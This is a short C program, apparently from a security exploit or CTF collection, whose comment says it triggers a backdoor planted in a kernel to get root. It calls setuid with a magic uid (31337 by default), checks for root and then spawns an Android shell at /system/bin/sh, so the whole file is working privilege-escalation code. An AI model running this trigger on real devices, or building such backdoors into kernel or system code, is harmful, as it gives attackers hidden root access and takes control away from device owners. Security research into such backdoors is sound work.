/*
 * trigger our backdoor in the kernel to get root!
 *
 * -jduck
 */
#include <stdio.h>
#include <unistd.h>


int main(int argc, char *argv[])
{
    int uid = 31337;

    if (argc > 1)
        uid = atoi(argv[1]);

    if (setuid(uid) == -1) {
        perror("setuid");
    }

    if (getuid()) {
        printf("failed to get root :-/\n");
        return 1;
    }

    execl("/system/bin/sh", "sh", NULL);
    perror("execl");
    return 1;
}

